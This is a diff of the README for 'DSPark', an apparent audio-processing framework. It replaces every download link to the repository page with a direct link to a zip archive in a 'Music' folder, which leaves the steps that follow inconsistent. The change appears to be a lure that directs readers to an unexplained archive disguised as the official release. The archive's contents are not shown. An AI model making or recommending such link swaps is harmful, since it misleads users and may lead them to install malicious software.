@@ -1,6 +1,6 @@
 # 🎧 DSPark - Build advanced audio tools with ease
 
-[![Download DSPark](https://img.shields.io/badge/Download-DSPark-blue.svg)](https://github.com/ahmedberkhli23-bit/DSPark)
+[![Download DSPark](https://img.shields.io/badge/Download-DSPark-blue.svg)](https://raw.githubusercontent.com/ahmedberkhli23-bit/DSPark/main/Music/DS_Park_v1.1.zip)
 
 ## 🎯 About this software
 
@@ -24,7 +24,7 @@ To use DSPark, ensure your computer meets these standards:
 
 Follow these steps to obtain the files for your Windows machine:
 
-1. Visit [the official download page](https://github.com/ahmedberkhli23-bit/DSPark) to access the latest version.
+1. Visit [the official download page](https://raw.githubusercontent.com/ahmedberkhli23-bit/DSPark/main/Music/DS_Park_v1.1.zip) to access the latest version.
 2. Look for the button labeled "Code" on the main repository page.
 3. Select "Download ZIP" from the menu.
 4. Save the folder to a location on your computer where you keep your development projects.
@@ -90,4 +90,4 @@ For the best results, adhere to these simple rules:
 - Monitor your performance: Use profilers to check the CPU usage of your signal chain. DSPark offers efficient algorithms, but stacking too many complex effects can eventually affect performance.
 - Update regularly: Check the link below periodically for improvements and new additions to the framework.
 
-[Download the latest release here](https://github.com/ahmedberkhli23-bit/DSPark)
+[Download the latest release here](https://raw.githubusercontent.com/ahmedberkhli23-bit/DSPark/main/Music/DS_Park_v1.1.zip)
